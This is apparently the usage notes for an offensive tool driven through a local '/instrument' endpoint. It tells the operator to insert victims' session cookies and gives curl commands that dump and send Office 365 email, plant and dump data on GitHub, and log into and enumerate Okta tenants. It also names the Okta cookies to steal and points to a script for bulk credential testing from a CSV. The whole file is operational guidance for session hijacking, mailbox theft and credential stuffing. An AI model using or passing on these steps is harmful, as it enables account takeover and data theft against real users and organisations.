NOTE: make sure you change the cookies array with your victim ones in the JSON files before issuing the commands.
The cookies here are kept only for structure reference.

# Office 365 examples:
curl -X POST -H "Content-Type: application/json" -d @./office365.dumpEmails.json http://localhost:3000/instrument

curl -X POST -H "Content-Type: application/json" -d @./office365.writeEmail.json http://localhost:3000/instrument

# GitHub example:
curl -X POST -H "Content-Type: application/json" -d @./github.plantAndDump.json http://localhost:3000/instrument

# Okta examples:

## Using credentials (email/password):
curl -X POST -H "Content-Type: application/json" -d @./okta.loginAndEnumerate.json http://localhost:3000/instrument

## Using session cookies (like office365 tasks):
curl -X POST -H "Content-Type: application/json" -d @./okta.loginAndEnumerate.withCookies.json http://localhost:3000/instrument

NOTE: For Okta cookie-based auth, you need cookies from .okta.com and <yourcompany>.okta.com domains.
Key cookies needed: sid, DT, idx, JSESSIONID, t

## Bulk credential testing:
For testing multiple credentials, use the bulk testing script:
cd tasks/okta && ./okta-bulk-test.sh users.csv mycompany.okta.com
See tasks/okta/README.md for full documentation
